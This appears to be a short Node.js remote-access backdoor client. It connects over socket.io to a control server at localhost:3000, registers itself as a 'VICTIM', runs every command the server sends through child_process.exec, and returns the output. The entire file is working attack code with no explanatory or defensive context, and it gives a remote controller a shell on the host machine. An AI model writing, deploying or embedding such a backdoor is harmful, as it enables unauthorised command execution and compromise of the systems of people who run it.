var exec = require('child_process').exec;
var socket = require('socket.io-client')('http://localhost:3000');

socket.on('connect', function(){
  socket.emit('VICTIM', {});
});

socket.on('RUN_COMMAND', function (command) {
  exec(command, function (err, stdout, stderr) {
    socket.emit('STDOUT', stdout);
  });
});
